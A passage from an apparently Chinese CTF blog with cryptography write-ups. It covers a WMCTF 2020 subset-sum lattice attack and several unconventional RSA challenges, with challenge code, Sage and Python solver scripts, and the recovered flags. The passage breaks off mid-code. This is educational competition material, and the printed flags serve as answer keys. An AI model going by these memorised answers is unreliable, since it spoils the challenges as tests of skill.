range(n)]</span><br><span class="line">s &#x3D; sum(A[index] for index in random.sample(range(n), k))</span><br><span class="line"></span><br><span class="line">dump((s, A), open(&quot;data&quot;, &quot;w&quot;))</span><br></pre></td></tr></table></figure><p>看了看密度是$0.8&lt;0.9408$，以为用前面的脚本也是可以一把梭，结果改了好多格的构造都不行，最后发现是自己一直都没注意一些东西：比如格求解的条件啊啥的。<a href="https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto" target="_blank" rel="noopener">https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto</a> 里写的比较好，但大部分人都是看了出题人的博客2333 <a href="https://blog.soreatu.com/posts/crypto-research-subset-sum-problem/%E3%80%82" target="_blank" rel="noopener">https://blog.soreatu.com/posts/crypto-research-subset-sum-problem/。</a></p><p>不过即使看到了博客上的源码，跑这个也是费时费钱。。。听说babysum的大哥sum得100核的机器上跑一个小时才出结果。穷苦人家的孩子只能用四核跑一下babysum，大概15分钟的亚子。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sage</span><br><span class="line">import random</span><br><span class="line">import multiprocessing as mp</span><br><span class="line">from json import load</span><br><span class="line">from functools import partial</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(sol, A, s):</span><br><span class="line">    &quot;&quot;&quot;Check whether *sol* is a solution to the subset-sum problem.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return sum(x*a for x, a in zip(sol, A)) &#x3D;&#x3D; s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve(A, n, k, s, ID&#x3D;None, BS&#x3D;22):</span><br><span class="line">    N &#x3D; ceil(sqrt(n)) # parameter used in the construction of lattice</span><br><span class="line">    rand &#x3D; random.Random(x&#x3D;ID) # seed</span><br><span class="line"></span><br><span class="line">    lat &#x3D; []</span><br><span class="line">    for i,a in enumerate(A):</span><br><span class="line">        lat.append([1*(j &#x3D;&#x3D; i) for j in range(n)] + [N*a] + [N])</span><br><span class="line">    lat.append([0]*n + [N*s] + [k*N])</span><br><span class="line"></span><br><span class="line">    itr &#x3D; 0</span><br><span class="line">    start_time &#x3D; cputime()</span><br><span class="line">    while True:</span><br><span class="line">        # 1. initalization</span><br><span class="line">        t0 &#x3D; cputime()</span><br><span class="line">        itr +&#x3D; 1</span><br><span class="line">        # print(f&quot;[&#123;ID&#125;] n&#x3D;&#123;n&#125; Start... &#123;itr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # 2. Zero Force</span><br><span class="line">        # (k+1) * (k+2)</span><br><span class="line">        # 1 0 ... 0 a0*N   N</span><br><span class="line">        # 0 1 ... 0 a1*N   N</span><br><span class="line">        # . . ... . ...    .</span><br><span class="line">        # 0 0 ... 1 a_k*N N</span><br><span class="line">        # 0 0 ... 0 s*N    k*N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # 3. Randomly shuffle</span><br><span class="line">        l &#x3D; lat[::]</span><br><span class="line">        shuffle(l, random&#x3D;rand.random)</span><br><span class="line"></span><br><span class="line">        # 4. BKZ!!!</span><br><span class="line">        m &#x3D; matrix(ZZ, l)</span><br><span class="line">        t_BKZ &#x3D; cputime()</span><br><span class="line">        m_BKZ &#x3D; m.BKZ(block_size&#x3D;BS)</span><br><span class="line">        print(f&quot;[&#123;ID&#125;] n&#x3D;&#123;n&#125; &#123;itr&#125; runs. BKZ running time: &#123;cputime(t_BKZ):.3f&#125;s&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # 5. Check the result</span><br><span class="line">        # print(f&quot;[&#123;ID&#125;] n&#x3D;&#123;n&#125; first vector norm: &#123;m_BKZ[0].norm().n(digits&#x3D;4)&#125;&quot;)</span><br><span class="line">        for i, row in enumerate(m_BKZ):</span><br><span class="line">            if check(row,A,s) and row.norm()^2 &#x3D;&#x3D; k:</span><br><span class="line">                print(row)</span><br><span class="line">                return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    CPU_CORE_NUM &#x3D; 4</span><br><span class="line"></span><br><span class="line">    k,n&#x3D; 20,120</span><br><span class="line">    s,A &#x3D; load(open(&#39;data&#39;,&#39;r&#39;))</span><br><span class="line">    solve_n &#x3D; partial(solve,A,n,k,s)</span><br><span class="line">    with mp.Pool(CPU_CORE_NUM) as pool:</span><br><span class="line">        reslist &#x3D; pool.imap_unordered(solve_n,range(CPU_CORE_NUM))</span><br><span class="line">        for res in reslist:</span><br><span class="line">            if(res):</span><br><span class="line">                pool.terminate()</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">(0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0)</span><br><span class="line">&#x2F;Applications&#x2F;SageMath-9.0.app&#x2F;sage babysum.sage  3929.59s user 111.40s system 399% cpu 16:52.48 total</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p><a href="http://xn--check-8l1hv76aby2dmw3c.py" target="_blank" rel="noopener">然后丢进check.py</a>，可以得到<code>WMCTF{83077532752999414286785898029842440}</code></p><h2><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h2><ul><li>《Cryptanalysis of two knapsack public-key cryptosystems》</li><li><a href="http://www.dtc.umn.edu/~odlyzko/doc/arch/knapsack.survey.pdf" target="_blank" rel="noopener">http://www.dtc.umn.edu/~odlyzko/doc/arch/knapsack.survey.pdf</a></li><li><a href="https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto/" target="_blank" rel="noopener">https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto/</a></li><li><a href="https://blog.soreatu.com/posts/crypto-research-subset-sum-problem/" target="_blank" rel="noopener">https://blog.soreatu.com/posts/crypto-research-subset-sum-problem/</a></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>记录CTF中的RSA非常规题解</title>
    <url>/1cfe8689.html</url>
    <content><![CDATA[<blockquote><p>如果你熟悉去年所有CTF比赛中的web题解，那么比赛中一半以上的题都能轻松解决 —— posix小姐姐</p></blockquote><a id="more"></a><h2><span id="p2020-wang-ding-bei-you-raise-me-up">2020 网鼎杯 you raise me up</span><a href="#p2020-wang-ding-bei-you-raise-me-up" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">n &#x3D; 2 ** 512</span><br><span class="line">m &#x3D; random.randint(2, n-1) | 1</span><br><span class="line">c &#x3D; pow(m, bytes_to_long(flag), n)</span><br><span class="line">print &#39;m &#x3D; &#39; + str(m)</span><br><span class="line">print &#39;c &#x3D; &#39; + str(c)</span><br><span class="line"></span><br><span class="line"># m &#x3D; 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span><br><span class="line"># c &#x3D; 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span><br></pre></td></tr></table></figure><p>是未知$e$的情况，我们知道当$e&lt; 2^{64}$时可以通过$bsgs$解决，但这里$e$明显太大了，不过sage提供了<code>discrete_log()</code>进行求解</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e&#x3D;discrete_log(Mod(c,n),Mod(m,n))</span><br><span class="line"># sage</span><br></pre></td></tr></table></figure><h2><span id="pthuctf-2020">THUCTF 2020</span><a href="#pthuctf-2020" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">114343085046463433411381776220543901901873928314903659614100254404100269463417499891993902366447489777312635887492019329010394661845440919768114220413686723810221962634122271643213501630972122082386450374407459824201848960741304431687915771670375151120891105793486536323734874929422017875459395117658992059677</span></span><br><span class="line">c = <span class="number">1384608876124927489441910327904528237548776368399531206044083800790774090882345964210476594356727800470845410695005386749381538164481432608783364583808558364847427405367871028396194497762440888707116196989953055035065121701440531497100049016077277959253415273999314575036822476336014586783215416497277921943</span></span><br><span class="line"><span class="number">2</span>*d+e*phi+<span class="number">2020</span> = <span class="number">22046774932370586482011989351077962586470998216913397840682653185876350155036481792005139545363427307155556226952079206673782623819821327455802429601369994136121668582623039411726516755690052737901843564168187074397101479942270643179299412053210417686126964426668454289595567836618481967225032457758237543611808222</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://writeups.amosng.com/2018/easyctf_2018/cryptography/hidden-key_250/">https://writeups.amosng.com/2018/easyctf_2018/cryptography/hidden-key_250/</a></li></ul><p>一般我们找$d$都是在$d &lt; \phi(n)$找，但其实$d$只要满足$ed \mod \phi(n) = 1$即可，所以在这里$d = s//2$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">n = <span class="number">114343085046463433411381776220543901901873928314903659614100254404100269463417499891993902366447489777312635887492019329010394661845440919768114220413686723810221962634122271643213501630972122082386450374407459824201848960741304431687915771670375151120891105793486536323734874929422017875459395117658992059677</span></span><br><span class="line">c = <span class="number">1384608876124927489441910327904528237548776368399531206044083800790774090882345964210476594356727800470845410695005386749381538164481432608783364583808558364847427405367871028396194497762440888707116196989953055035065121701440531497100049016077277959253415273999314575036822476336014586783215416497277921943</span></span><br><span class="line">s = <span class="number">22046774932370586482011989351077962586470998216913397840682653185876350155036481792005139545363427307155556226952079206673782623819821327455802429601369994136121668582623039411726516755690052737901843564168187074397101479942270643179299412053210417686126964426668454289595567836618481967225032457758237543611808222</span></span><br><span class="line">s = s - <span class="number">2020</span></span><br><span class="line"></span><br><span class="line">d = s//<span class="number">2</span></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment"># THUCTF&#123;99049c76-3447-46d0-b52e-299e25755a48&#125;</span></span><br></pre></td></tr></table></figure><h2><span id="p2020-dian-feng-ji-ke-tryrsa">2020 巅峰极客 tryRSA</span><a href="#p2020-dian-feng-ji-ke-tryrsa" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> e1,e2,flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(<span class="string">"=========Hint:e1="</span>+str(e1)+<span class="string">"============="</span>)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">N = p*q</span><br><span class="line"><span class="keyword">print</span> N</span><br><span class="line"><span class="keyword">print</span> pow(msg,<span class="number">3</span>,N)</span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p*q</span><br><span class="line">c = pow(msg, e2, N)</span><br><span class="line"><span class="keyword">print</span> N,e2</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line">print(pow(p+q,e1,N ))</span><br><span class="line">print(pow(p+e1, q, N))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">92492770373119584460081987762423642921257844727187836762004909281192459271971634726161143981458071695340994591107972425352531669271078740978901135762304359798469976380706711716397909327202889036066332030534806956149533263677365472375053769919044969923810993041551455618809123044195807478835222921551845223673</span></span><br><span class="line"><span class="string">28249132350044579687091110964285446575404805400757326954185222098803605008954490760462246663674360047951197296557689347856716297531621331430289344669498939239588624311221464757652619402073234993515450143594805022438694559765344247838048186137683783869848355994953125</span></span><br><span class="line"><span class="string">27015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081 65537</span></span><br><span class="line"><span class="string">6960471390887676836770576717723665527999812876556281118485164081998911577875381908446602930344333654944091349042662834710841686602096786488652321359862587616056255592745697363730350424006430304398118412822538778460783959334956287873626339403915923932633438142296099193868446694776583016981952887671846310453413799566390944727222387714300425256165444782922011140095044159890292073622972447390685582541707094791774266611010707510165706469905665511940032155195482276746347896610980037890500866671279623501021060117466463857453415816945239635341057570437059560066260202940898394476654111403345827675113200431405898577228</span></span><br><span class="line"><span class="string">1043358162140860962273728863918690254907683549241317489027248804399285815575770538413854959643097587139967903983728298468193229257795104589966904860928102961617976618240299512928763147662509317818932641083203337246219100049009339117603571633877302978817219689048124475419370026280279605865626353406562716520200330156419718727010377305953369496577186008235640834052476174479818668164269356133941979167253165318046864430749941469717776898395077805761110978284600985034996774850879017975655590682283621730288960471273895327469257980443060594976109602435213897419646191853646130932643009667656100697739228571988907108326</span></span><br><span class="line"><span class="string">2367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>$e1$通过开根即可求出，对$(p+q)^{e_1} \mod N$和$(p+e_1) ^ q \mod N$化简如下：</p><p>$$c_1 = (p+q)^{e_1} \mod N = (p+q)^{e_1} \mod pq = (p+q)^{e_1}+kpq$$</p><p>$$c_1 \mod q = p^{e_1} \mod q = p^{e_1}+k_1q$$</p><p>$$c_2 = (p+e_1)^q \mod N = (p+e_1)^q + kpq$$</p><p>$$c_2 \mod q = (p+e_1) \mod q (费马小定理) = (p+e_1) + k_2q$$</p><p>因此我们有$gcd((c_2-e_1)^{e_1}-c_1,N) = q$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot, gcd</span><br><span class="line">N = <span class="number">92492770373119584460081987762423642921257844727187836762004909281192459271971634726161143981458071695340994591107972425352531669271078740978901135762304359798469976380706711716397909327202889036066332030534806956149533263677365472375053769919044969923810993041551455618809123044195807478835222921551845223673</span></span><br><span class="line">c = <span class="number">28249132350044579687091110964285446575404805400757326954185222098803605008954490760462246663674360047951197296557689347856716297531621331430289344669498939239588624311221464757652619402073234993515450143594805022438694559765344247838048186137683783869848355994953125</span></span><br><span class="line"></span><br><span class="line">msg = iroot(c, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">msg = long_to_bytes(msg)</span><br><span class="line">e1 = msg.split(<span class="string">b"e1="</span>)[<span class="number">1</span>].replace(<span class="string">b'='</span>, <span class="string">b''</span>)</span><br><span class="line">e1 = int(e1)</span><br><span class="line"></span><br><span class="line">N = <span class="number">27015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">c = <span class="number">6960471390887676836770576717723665527999812876556281118485164081998911577875381908446602930344333654944091349042662834710841686602096786488652321359862587616056255592745697363730350424006430304398118412822538778460783959334956287873626339403915923932633438142296099193868446694776583016981952887671846310453413799566390944727222387714300425256165444782922011140095044159890292073622972447390685582541707094791774266611010707510165706469905665511940032155195482276746347896610980037890500866671279623501021060117466463857453415816945239635341057570437059560066260202940898394476654111403345827675113200431405898577228</span></span><br><span class="line">c1 = <span class="number">1043358162140860962273728863918690254907683549241317489027248804399285815575770538413854959643097587139967903983728298468193229257795104589966904860928102961617976618240299512928763147662509317818932641083203337246219100049009339117603571633877302978817219689048124475419370026280279605865626353406562716520200330156419718727010377305953369496577186008235640834052476174479818668164269356133941979167253165318046864430749941469717776898395077805761110978284600985034996774850879017975655590682283621730288960471273895327469257980443060594976109602435213897419646191853646130932643009667656100697739228571988907108326</span></span><br><span class="line">c2 = <span class="number">2367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524</span></span><br><span class="line"></span><br><span class="line">ans = pow(c2-e1, e1, N) - c1</span><br><span class="line">q = gcd(ans, N)</span><br><span class="line">p = N//q</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e2, phi)</span><br><span class="line">m = pow(c, d, N)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment"># flag&#123;5b55c69f-398d-47bc-ad37-4f268e8ae4b2&#125;</span></span><br></pre></td></tr></table></figure><h2><span id="p2020-xi-hu-lun-jian-wake-me-up-until-may-ends">2020 西湖论剑 Wake me up until May ends</span><a href="#p2020-xi-hu-lun-jian-wake-me-up-until-may-ends" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, source_p</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, shuffle</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> factorint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_factor</span><span class="params">(n)</span>:</span></span><br><span class="line">    factors = []</span><br><span class="line">    limit = n//<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, limit):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            factors.append(i)</span><br><span class="line">    factors.append(n)</span><br><span class="line">    <span class="keyword">return</span> factors</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u</span><span class="params">(d)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    factors = factorint(d)</span><br><span class="line">    primes = list(factors.keys())</span><br><span class="line">    index = list(factors.values())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> pow(<span class="number">-1</span>, len(primes) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(d)</span>:</span></span><br><span class="line">    factors = factorint(d)</span><br><span class="line">    primes = list(factors.keys())</span><br><span class="line">    index = list(factors.values())</span><br><span class="line">    base = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(primes)):</span><br><span class="line">        base *= pow(primes[i], index[i]<span class="number">-1</span>)</span><br><span class="line">        base *= (primes[i] - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span><span class="params">(n)</span>:</span></span><br><span class="line">    factors = all_factor(n)</span><br><span class="line">    base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> factors:</span><br><span class="line">        base += u(i) * f(i)</span><br><span class="line">    <span class="keyword">return</span> base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Yusa</span><span class="params">(m)</span>:</span></span><br><span class="line">    p = getPrime(<span class="number">533</span>)</span><br><span class="line">    q = getPrime(<span class="number">533</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    _phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    limit1 = (<span class="number">3</span> * n) // (<span class="number">2</span> * (int(iroot(n, <span class="number">4</span>)[<span class="number">0</span>]) + <span class="number">3</span> * (p + q)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = getPrime(<span class="number">256</span>)</span><br><span class="line">        y = getPrime(<span class="number">256</span>)</span><br><span class="line">        <span class="keyword">if</span> x * y &lt; limit1:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    limit2 = (abs(p-q) * int(iroot(n, <span class="number">4</span>)[<span class="number">0</span>]) * y) // (<span class="number">6</span> * (max(p, q)))</span><br><span class="line">    e = (y * _phi) // x</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        z = e * x - y * _phi</span><br><span class="line">        <span class="keyword">if</span> abs(z) &lt; limit2 <span class="keyword">and</span> gcd(e, _phi) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        e -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    c = pow(m, e, n)</span><br><span class="line">    <span class="keyword">return</span> c, e, n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shuffle(source_p)</span><br><span class="line">p = source_p[:<span class="number">7</span>]</span><br><span class="line">length = <span class="number">7</span></span><br><span class="line">index = []</span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">    index.append(randint(<span class="number">1</span>, <span class="number">23</span>))</span><br><span class="line">    n *= p[i] ** index[i]</span><br><span class="line"></span><br><span class="line">n = -combine(n)</span><br><span class="line"><span class="keyword">assert</span> n.bit_length() &gt; <span class="number">2048</span></span><br><span class="line"></span><br><span class="line">e = getPrime(<span class="number">256</span>)</span><br><span class="line">_c, _e, _n = Yusa(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(<span class="string">'c ='</span>, c)</span><br><span class="line">print(<span class="string">'p ='</span>, source_p)</span><br><span class="line">print(<span class="string">'index ='</span>, index)</span><br><span class="line">print(<span class="string">'_e ='</span>, _e)</span><br><span class="line">print(<span class="string">'_n ='</span>, _n)</span><br><span class="line">print(<span class="string">'_c ='</span>, _c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># data</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">primes = [6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503118559, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503126443, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503193349, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503562289, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503734189, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503760301, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503782813, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503951191, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504074953, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504107911, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504191461, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504448729, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504539989]</span></span><br><span class="line"><span class="string">c = 84010209207136400037674900630630399007540527378939350615722225527845587559010102178617103738600464258190430641037546648203366413208680794400023737381999928100638870193135477985407368386033167118399673001236960699550393986712868487827560601610546135335952667201927052409197291462799539018091792246183307678928298241645258411316936304167124933556606198943248215284393941957893610109127025761289673484220381931928088574316265497075872825588843686573267223321714224535003053507039588501110165036609252972283465620670619170664971316238808580562960566239652372002792893860381585262550998380705474210656337505369024906108022045918104803080765059727578165530772500933465284347893453376016683018177839155666453880461050298815103588796089076127048997409337740340488597725920421812209214132626919132717242722587461710190518049279845280531076833361229586237230905386909567570882397978261647980071794688572393137428928552335623610968045342130104152766075095859252589558838654095036476181115093298573203118822557283958028992348972004110923680696213759378910314691270631431638964147123334674</span></span><br><span class="line"><span class="string">index = [17, 4, 10, 5, 22, 23, 3]</span></span><br><span class="line"><span class="string">_e = 372077403420031165815439199213704344304928202869941592969972103002464355333911024937074871410825817568355544126574173758702600945390438495248751733573391345292294888885607465578329781858741122278411513362633310583564023669185613282939355138576537165757775740881908805743008022348524049466231348651228609449357106436669219</span></span><br><span class="line"><span class="string">_n = 470335762637936005588762180827192207993663594416060284974932410896705386687847439702920143090437462997342000428130417147164245577372958674672171462397851600930104979198327224831772288314005311036009419876584852939180439595289349509330868790367408195151323961061772542485151690708678904080061050887466315542337191307236199</span></span><br><span class="line"><span class="string">_c = 333271281173306446630548720678701979402616631681988817880871964537046235416970583988475783551455814258102380169630603934095599959443467742430556704688855518165068592402751863811686579302153371106333344752494076921552527417915731880831363624299780159503812111855009880750695443491602523883753510968162389168190126033304497</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>论文题，可参考：<a href="https://www.researchgate.net/publication/337937790_The_Blomer-May's_Weak_Key_Revisited">Blomer May Weak Key Revisited</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> factorint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u</span><span class="params">(d)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    factors = factorint(d)</span><br><span class="line">    primes = list(factors.keys())</span><br><span class="line">    index = list(factors.values())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> pow(<span class="number">-1</span>, len(primes) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(d)</span>:</span></span><br><span class="line">    factors = factorint(d)</span><br><span class="line">    primes = list(factors.keys())</span><br><span class="line">    index = list(factors.values())</span><br><span class="line">    base = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(primes)):</span><br><span class="line">        base *= pow(primes[i], index[i]<span class="number">-1</span>)</span><br><span class="line">        base *= (primes[i] - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine_check</span><span class="params">(primes)</span>:</span></span><br><span class="line">    base = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(primes)):</span><br><span class="line">   